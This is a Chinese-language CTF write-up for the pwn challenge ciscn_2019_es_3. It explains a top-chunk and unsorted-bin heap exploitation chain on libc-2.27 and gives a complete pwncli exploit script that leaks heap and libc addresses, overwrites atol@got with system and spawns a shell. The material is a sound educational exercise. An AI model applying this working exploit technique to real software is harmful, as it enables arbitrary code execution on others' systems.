# ciscn_2019_es_3



### 总结

题目没有提供`free`，基本能算是`house of force`+`house of orange`，但又不完全是。应该说主要还是围绕着`top chunk`进行利用，详细利用过程如下：

- 利用`strlen`的漏洞，溢出修改`top chunk`的`size`，需要滿足要求通过检查，之后会把`top chunk`释放到`unsorted bin`中。比如控制剩下的`top chunk`的`size`为`0x1520`，然后溢出修改为`0x520`
- 申请一个大的`chunk`，把`old top chunk`释放到`unsorted bin`中
- 修改`unsorted bin chunk`的`size`为更大的值，比如修改为`0x2000`
- 然后申请`0x2000-0x10`用户大小，就会把伪造的`unsorted bin chunk`返回给用户，这个`chunk`可以修改到新的`top chunk`的`size`
- 本来这里想直接用`house of force`，因为可以泄露出`heap`的地址。但是由于在`read_int`中有校验，输入不能为负数，所以就不能使用。因此，这里继续上述步骤造出一个新的`unsorted bin chunk`。
- 接下来利用`edit`来溢出修改新的`unsorted bin chunk`的`bk`，使得`chunklist[0]`被写为`main_arena+96`。这个地址存储着`top chunk`的指针。
- 利用`edit(0)`编辑`top chunk`的指针，指向`bss`段，这里注意一下，还要修复`unsorted bin`链表
- 直接分配到`chunklist`，利用`edit`将`atol@got`的内容写为`system`即可

<!-- more -->

### checksec

环境为`libc-2.27`

![image-20211024183359268](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211024183359268.png)

### 漏洞点

在`edit`分支中，修改完后`chunksize`的更新使用的是`strlen`，存在溢出修改`chunk size`的机会：

![image-20211024183515481](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211024183515481.png)



### EXP

打远程的时候，发送超过`0x1000`个字符就挂了，不知道为啥。

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def read_name(name):
    p.sendafter("name :", name)

def add(size, data="deadbeef"):
    p.sendlineafter("Your choice :", "1")
    p.sendlineafter("Size of page :", str(size))
    p.sendafter("Content :", data)


def show(idx):
    p.sendlineafter("Your choice :", "2")
    p.sendlineafter("Index of page :", str(idx))
    p.recvline_contains("Content :")
    m = p.recvline(0)
    info(f"Get info: {m}")
    return m

def edit(idx, data):
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Index of page :", str(idx))
    p.sendafter("Content:", data)


def name_info(name="", choose=1):
    p.sendlineafter("Your choice :", "4")
    m = p.recvline_startswith("name : ")
    info(f"Get info: {m}")
    p.sendlineafter("Do you want to change the name? (yes:1 / no:0) ", str(choose))
    if choose:
        read_name(name)
    return m

# helpful to leak heap
read_name("a"*0x40)

add(0x1e770)

# get heap base
m = name_info(choose=0)
heap_base = u64_ex(m[0x47:]) - 0x260
log_heap_base_addr(heap_base)

add(0xf8)
edit(1, "a"*0xf8)
edit(1, b"a"*0xf8+p16(0x521))

# free old top chunk
add(0x600)

edit(1, b"a"*0xf8+p16(0x2001))

# clear unsortedbin list and change new top chunk's size
add(0x2000-0x10, flat({0x1b28:0x9f1})) # 3 

# get a new unsorted bin chunk
add(0x1000)

# unsorted bin attack
edit(3, flat({0x1b28:[0x9f1, 0, 0x602100-0x10]}))

add(0x9e0)

# leak libc addr 
m = name_info(flat(0, 0x20ff1))
libc_base = u64_ex(m[0x47:]) - 0x3ebca0
log_libc_base_addr(libc_base)
libc.address = libc_base

# change top-chunk ptr and repair the broken unsorted bin list
edit(0, flat([0x6020c0, 0, libc_base + 0x3ebca0, libc_base + 0x3ebca0]))

# change ptr--->atol@got
add(0x60, flat({0x30:[[elf.got.atol]*4]}))

# change atol@got to system
edit(1, p64(libc.sym.system))

# get shell
p.sendline("/bin/sh")

# get flag
get_flag_when_get_shell(p)

p.interactive()
```

### 引用与参考
1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://roderickchan.github.io/zh-cn/2021-10-24-ciscn-2019-es-3/  

